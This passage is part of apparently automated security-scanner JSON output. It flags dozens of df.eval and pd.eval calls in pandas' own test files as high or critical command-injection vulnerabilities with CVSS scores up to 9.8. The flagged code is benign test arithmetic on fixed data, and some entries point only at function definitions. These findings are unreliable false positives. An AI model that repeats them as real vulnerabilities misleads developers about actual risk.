            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 187,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"c = ((a1 == 'Y') & True)\")",
            "context": "    def test_eval_object_dtype_binop(self):\n        # GH#24883\n        df = DataFrame({\"a1\": [\"Y\", \"N\"]})\n        res = df.eval(\"c = ((a1 == 'Y') & True)\")\n        expected = DataFrame({\"a1\": [\"Y\", \"N\"], \"c\": [True, False]})\n        tm.assert_frame_equal(res, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 191,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_extension_array_eval(self, engine, parser, request):",
            "context": "        expected = DataFrame({\"a1\": [\"Y\", \"N\"], \"c\": [True, False]})\n        tm.assert_frame_equal(res, expected)\n\n    def test_extension_array_eval(self, engine, parser, request):\n        # GH#58748\n        if engine == \"numexpr\":\n            mark = pytest.mark.xfail(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 199,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"a / b\", engine=engine, parser=parser)",
            "context": "            )\n            request.applymarker(mark)\n        df = DataFrame({\"a\": pd.array([1, 2, 3]), \"b\": pd.array([4, 5, 6])})\n        result = df.eval(\"a / b\", engine=engine, parser=parser)\n        expected = Series(pd.array([0.25, 0.40, 0.50]))\n        tm.assert_series_equal(result, expected)\n",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_complex_eval(self, engine, parser):",
            "context": "        expected = Series(pd.array([0.25, 0.40, 0.50]))\n        tm.assert_series_equal(result, expected)\n\n    def test_complex_eval(self, engine, parser):\n        # GH#21374\n        df = DataFrame({\"a\": [1 + 2j], \"b\": [1 + 1j]})\n        result = df.eval(\"a/b\", engine=engine, parser=parser)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 206,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"a/b\", engine=engine, parser=parser)",
            "context": "    def test_complex_eval(self, engine, parser):\n        # GH#21374\n        df = DataFrame({\"a\": [1 + 2j], \"b\": [1 + 1j]})\n        result = df.eval(\"a/b\", engine=engine, parser=parser)\n        expected = Series([1.5 + 0.5j])\n        tm.assert_series_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 620,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"df[df > 0 and df2 > 0]\", engine=engine, parser=parser)",
            "context": "        result = df.query(\"(@df > 0) & (@df2 > 0)\", engine=engine, parser=parser)\n        tm.assert_frame_equal(result, expected)\n\n        result = pd.eval(\"df[df > 0 and df2 > 0]\", engine=engine, parser=parser)\n        tm.assert_frame_equal(result, expected)\n\n        result = pd.eval(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 623,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(",
            "context": "        result = pd.eval(\"df[df > 0 and df2 > 0]\", engine=engine, parser=parser)\n        tm.assert_frame_equal(result, expected)\n\n        result = pd.eval(\n            \"df[df > 0 and df2 > 0 and df[df > 0] > 0]\", engine=engine, parser=parser\n        )\n        expected = df[(df > 0) & (df2 > 0) & (df[df > 0] > 0)]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 629,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"df[(df>0) & (df2>0)]\", engine=engine, parser=parser)",
            "context": "        expected = df[(df > 0) & (df2 > 0) & (df[df > 0] > 0)]\n        tm.assert_frame_equal(result, expected)\n\n        result = pd.eval(\"df[(df>0) & (df2>0)]\", engine=engine, parser=parser)\n        expected = df.query(\"(@df>0) & (@df2>0)\", engine=engine, parser=parser)\n        tm.assert_frame_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 872,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"x + 1\", engine=engine, parser=parser)",
            "context": "    def test_nested_scope(self, engine, parser):\n        # smoke test\n        x = 1  # noqa: F841\n        result = pd.eval(\"x + 1\", engine=engine, parser=parser)\n        assert result == 2\n\n        df = DataFrame(np.random.default_rng(2).standard_normal((5, 3)))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 887,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"df[(df > 0) & (df2 > 0)]\", engine=engine, parser=parser)",
            "context": "            df.query(\"(df>0) & (df2>0)\", engine=engine, parser=parser)\n\n        expected = df[(df > 0) & (df2 > 0)]\n        result = pd.eval(\"df[(df > 0) & (df2 > 0)]\", engine=engine, parser=parser)\n        tm.assert_frame_equal(expected, result)\n\n        expected = df[(df > 0) & (df2 > 0) & (df[df > 0] > 0)]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 891,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(",
            "context": "        tm.assert_frame_equal(expected, result)\n\n        expected = df[(df > 0) & (df2 > 0) & (df[df > 0] > 0)]\n        result = pd.eval(\n            \"df[(df > 0) & (df2 > 0) & (df[df > 0] > 0)]\", engine=engine, parser=parser\n        )\n        tm.assert_frame_equal(expected, result)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1177,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = frame.eval(\"a + b\", engine=engine, parser=parser)",
            "context": "        )\n\n    def test_simple_expr(self, frame, parser, engine):\n        res = frame.eval(\"a + b\", engine=engine, parser=parser)\n        expect = frame.a + frame.b\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1182,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = frame.eval(\"a[a < 1] + b\", engine=engine, parser=parser)",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_bool_arith_expr(self, frame, parser, engine):\n        res = frame.eval(\"a[a < 1] + b\", engine=engine, parser=parser)\n        expect = frame.a[frame.a < 1] + frame.b\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1192,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(f\"a {op} b\", engine=engine, parser=parser)",
            "context": "        msg = r\"unsupported operand type\\(s\\) for .+: '.+' and '.+'|Cannot\"\n\n        with pytest.raises(TypeError, match=msg):\n            df.eval(f\"a {op} b\", engine=engine, parser=parser)\n\n\nclass TestDataFrameQueryBacktickQuoting:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1241,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"A + `B B`\")",
            "context": "        tm.assert_frame_equal(res, expect)\n\n    def test_single_backtick_variable_expr(self, df):\n        res = df.eval(\"A + `B B`\")\n        expect = df[\"A\"] + df[\"B B\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"`B B` + `C C`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_two_backtick_variables_expr(self, df):\n        res = df.eval(\"`B B` + `C C`\")\n        expect = df[\"B B\"] + df[\"C C\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"`C_C` + A\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_already_underscore_variable(self, df):\n        res = df.eval(\"`C_C` + A\")\n        expect = df[\"C_C\"] + df[\"A\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1256,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"C_C + `C C`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_same_name_but_underscores(self, df):\n        res = df.eval(\"C_C + `C C`\")\n        expect = df[\"C_C\"] + df[\"C C\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1261,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"A + `D_D D`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_mixed_underscores_and_spaces(self, df):\n        res = df.eval(\"A + `D_D D`\")\n        expect = df[\"A\"] + df[\"D_D D\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1266,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"A + `C_C`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_backtick_quote_name_with_no_spaces(self, df):\n        res = df.eval(\"A + `C_C`\")\n        expect = df[\"A\"] + df[\"C_C\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1271,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"`E.E` + `F-F` - A\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_special_characters(self, df):\n        res = df.eval(\"`E.E` + `F-F` - A\")\n        expect = df[\"E.E\"] + df[\"F-F\"] - df[\"A\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1276,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"A + `1e1`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_start_with_digit(self, df):\n        res = df.eval(\"A + `1e1`\")\n        expect = df[\"A\"] + df[\"1e1\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1281,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"A + `def`\")",
            "context": "        tm.assert_series_equal(res, expect)\n\n    def test_keyword(self, df):\n        res = df.eval(\"A + `def`\")\n        expect = df[\"A\"] + df[\"def\"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1306,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = df.eval(\"` A` + `  `\")",
            "context": "        tm.assert_frame_equal(res, expect)\n\n    def test_start_with_spaces(self, df):\n        res = df.eval(\"` A` + `  `\")\n        expect = df[\" A\"] + df[\"  \"]\n        tm.assert_series_equal(res, expect)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1318,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"@pd.thing\")",
            "context": "    def test_missing_attribute(self, df):\n        message = \"module 'pandas' has no attribute 'thing'\"\n        with pytest.raises(AttributeError, match=message):\n            df.eval(\"@pd.thing\")\n\n    def test_failing_quote(self, df):\n        msg = r\"(Could not convert ).*( to a valid Python identifier.)\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1348,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"@func()\")",
            "context": "\n        funcs = [func]  # noqa: F841\n\n        df.eval(\"@func()\")\n\n        with pytest.raises(TypeError, match=\"Only named functions are supported\"):\n            df.eval(\"@funcs[0]()\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1351,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"@funcs[0]()\")",
            "context": "        df.eval(\"@func()\")\n\n        with pytest.raises(TypeError, match=\"Only named functions are supported\"):\n            df.eval(\"@funcs[0]()\")\n\n        with pytest.raises(TypeError, match=\"Only named functions are supported\"):\n            df.eval(\"@funcs[0].__call__()\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1354,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"@funcs[0].__call__()\")",
            "context": "            df.eval(\"@funcs[0]()\")\n\n        with pytest.raises(TypeError, match=\"Only named functions are supported\"):\n            df.eval(\"@funcs[0].__call__()\")\n\n    def test_ea_dtypes(self, any_numeric_ea_and_arrow_dtype):\n        # GH#29618",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1363,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"c = b - a\")",
            "context": "        )\n        warning = RuntimeWarning if NUMEXPR_INSTALLED else None\n        with tm.assert_produces_warning(warning):\n            result = df.eval(\"c = b - a\")\n        expected = DataFrame(\n            [[1, 2, 1], [3, 4, 1]],\n            columns=[\"a\", \"b\", \"c\"],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1376,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"c = b - 1\")",
            "context": "        df = DataFrame([[1, 2], [3, 4]], columns=[\"a\", \"b\"], dtype=\"Float64\")\n        warning = RuntimeWarning if NUMEXPR_INSTALLED else None\n        with tm.assert_produces_warning(warning):\n            result = df.eval(\"c = b - 1\")\n        expected = DataFrame(\n            [[1, 2, 1], [3, 4, 3]], columns=[\"a\", \"b\", \"c\"], dtype=\"Float64\"\n        )",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 1387,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"c = 2 - 1\")",
            "context": "        df = DataFrame(\n            [[1, 2], [3, 4]], columns=[\"a\", \"b\"], dtype=any_numeric_ea_and_arrow_dtype\n        )\n        result = df.eval(\"c = 2 - 1\")\n        expected = DataFrame(\n            {\n                \"a\": Series([1, 3], dtype=any_numeric_ea_and_arrow_dtype),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/copy_view/test_methods.py",
            "line": 2015,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_eval(using_copy_on_write):",
            "context": "    tm.assert_series_equal(ser, ser_orig)\n\n\ndef test_eval(using_copy_on_write):\n    df = DataFrame({\"a\": [1, 2, 3], \"b\": 1})\n    df_orig = df.copy()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/copy_view/test_methods.py",
            "line": 2019,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"c = a+b\")",
            "context": "    df = DataFrame({\"a\": [1, 2, 3], \"b\": 1})\n    df_orig = df.copy()\n\n    result = df.eval(\"c = a+b\")\n    if using_copy_on_write:\n        assert np.shares_memory(get_array(df, \"a\"), get_array(result, \"a\"))\n    else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/copy_view/test_methods.py",
            "line": 2034,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"c = a+b\", inplace=True)",
            "context": "    df_orig = df.copy()\n    df_view = df[:]\n\n    df.eval(\"c = a+b\", inplace=True)\n    assert np.shares_memory(get_array(df, \"a\"), get_array(df_view, \"a\"))\n\n    with tm.assert_cow_warning(warn_copy_on_write):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/generic/test_finalize.py",
            "line": 449,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"A + 1\", engine=\"numexpr\")",
            "context": "    pytest.importorskip(\"numexpr\")\n    df = pd.DataFrame({\"A\": [1, 2]})\n    df.attrs[\"A\"] = 1\n    result = df.eval(\"A + 1\", engine=\"numexpr\")\n    assert result.attrs == {\"A\": 1}\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_compat.py",
            "line": 31,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(\"a + b\", engine=engine, parser=parser)",
            "context": "    if engine == \"numexpr\":\n        pytest.importorskip(\"numexpr\")\n    a, b = 1, 2  # noqa: F841\n    res = pd.eval(\"a + b\", engine=engine, parser=parser)\n    assert res == 3\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 146,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "            msg = \"'BoolOp' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                ex = f\"(lhs {cmp1} rhs) {binop} (lhs {cmp2} rhs)\"\n                pd.eval(ex, engine=engine, parser=parser)\n            return\n\n        lhs_new = _eval_single_bin(lhs, cmp1, rhs, engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "        expected = _eval_single_bin(lhs_new, binop, rhs_new, engine)\n\n        ex = f\"(lhs {cmp1} rhs) {binop} (lhs {cmp2} rhs)\"\n        result = pd.eval(ex, engine=engine, parser=parser)\n        tm.assert_equal(result, expected)\n\n    @pytest.mark.parametrize(\"cmp_op\", expr.CMP_OPS_SYMS)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 167,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "\n            with pytest.raises(NotImplementedError, match=msg):\n                ex = f\"lhs {cmp_op} rhs\"\n                pd.eval(ex, engine=engine, parser=parser)\n            return\n\n        ex = f\"lhs {cmp_op} rhs\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 181,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(",
            "context": "        )\n        if cmp_op in (\"in\", \"not in\") and not is_list_like(rhs):\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(\n                    ex,\n                    engine=engine,\n                    parser=parser,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 189,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "                )\n        else:\n            expected = _eval_single_bin(lhs, cmp_op, rhs, engine)\n            result = pd.eval(ex, engine=engine, parser=parser)\n            tm.assert_equal(result, expected)\n\n    @pytest.mark.parametrize(\"op\", expr.CMP_OPS_SYMS)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 198,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex, engine=engine, parser=parser)",
            "context": "            msg = \"'(In|NotIn)' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                ex = f\"~(lhs {op} rhs)\"\n                pd.eval(ex, engine=engine, parser=parser)\n            return\n\n        if (",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 226,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(",
            "context": "        )\n        if is_scalar(rhs) and op in skip_these:\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(\n                    ex,\n                    engine=engine,\n                    parser=parser,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "                expected = not expected\n            else:\n                expected = ~expected\n            result = pd.eval(ex, engine=engine, parser=parser)\n            tm.assert_almost_equal(expected, result)\n\n    @pytest.mark.parametrize(\"cmp1\", [\"<\", \">\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 252,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(ex1, engine=engine, parser=parser)",
            "context": "            ex1 = f\"lhs {cmp1} mid {cmp2} rhs\"\n            msg = \"'BoolOp' nodes are not implemented\"\n            with pytest.raises(NotImplementedError, match=msg):\n                pd.eval(ex1, engine=engine, parser=parser)\n            return\n\n        lhs_new = _eval_single_bin(lhs, cmp1, mid, engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 265,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "            expected = _eval_single_bin(lhs_new, \"&\", rhs_new, engine)\n\n            for ex in (ex1, ex2, ex3):\n                result = pd.eval(ex, engine=engine, parser=parser)\n\n                tm.assert_almost_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 274,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "    )\n    def test_binary_arith_ops(self, arith1, lhs, rhs, engine, parser):\n        ex = f\"lhs {arith1} rhs\"\n        result = pd.eval(ex, engine=engine, parser=parser)\n        expected = _eval_single_bin(lhs, arith1, rhs, engine)\n\n        tm.assert_almost_equal(result, expected)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 279,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "\n        tm.assert_almost_equal(result, expected)\n        ex = f\"lhs {arith1} rhs {arith1} rhs\"\n        result = pd.eval(ex, engine=engine, parser=parser)\n        nlhs = _eval_single_bin(lhs, arith1, rhs, engine)\n        try:\n            nlhs, ghs = nlhs.align(rhs)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 299,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "expected = eval(f\"nlhs {arith1} ghs\")",
            "context": "                #  can be replaced again by the assert_numpy_array_equal statement\n                tm.assert_almost_equal(result.values, expected)\n            else:\n                expected = eval(f\"nlhs {arith1} ghs\")\n                tm.assert_almost_equal(result, expected)\n\n    # modulus, pow, and floor division require special casing",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 306,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "\n    def test_modulus(self, lhs, rhs, engine, parser):\n        ex = r\"lhs % rhs\"\n        result = pd.eval(ex, engine=engine, parser=parser)\n        expected = lhs % rhs\n        tm.assert_almost_equal(result, expected)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 326,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = pd.eval(ex, engine=engine, parser=parser)",
            "context": "        ex = \"lhs // rhs\"\n\n        if engine == \"python\":\n            res = pd.eval(ex, engine=engine, parser=parser)\n            expected = lhs // rhs\n            tm.assert_equal(res, expected)\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 335,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pd.eval(",
            "context": "                \"'VariableNode'\"\n            )\n            with pytest.raises(TypeError, match=msg):\n                pd.eval(\n                    ex,\n                    local_dict={\"lhs\": lhs, \"rhs\": rhs},\n                    engine=engine,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 347,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "        # odd failure on win32 platform, so skip\n        ex = \"lhs ** rhs\"\n        expected = _eval_single_bin(lhs, \"**\", rhs, engine)\n        result = pd.eval(ex, engine=engine, parser=parser)\n\n        if (\n            is_scalar(lhs)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 362,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(ex, engine=engine, parser=parser)",
            "context": "            tm.assert_almost_equal(result, expected)\n\n            ex = \"(lhs ** rhs) ** rhs\"\n            result = pd.eval(ex, engine=engine, parser=parser)\n\n            middle = _eval_single_bin(lhs, \"**\", rhs, engine)\n            expected = _eval_single_bin(middle, \"**\", rhs, engine)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/computation/test_eval.py",
            "line": 375,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = pd.eval(\"~elb\", engine=engine, parser=parser)",
            "context": "        except AttributeError:\n            elb = np.array([bool(lhs)])\n        expected = ~elb\n        result = pd.eval(\"~elb\", engine=engine, parser=parser)\n        tm.assert_almost_equal(expected, result)\n\n    def test_frame_invert(self, engine, parser):",
            "cvss_score": 7.5
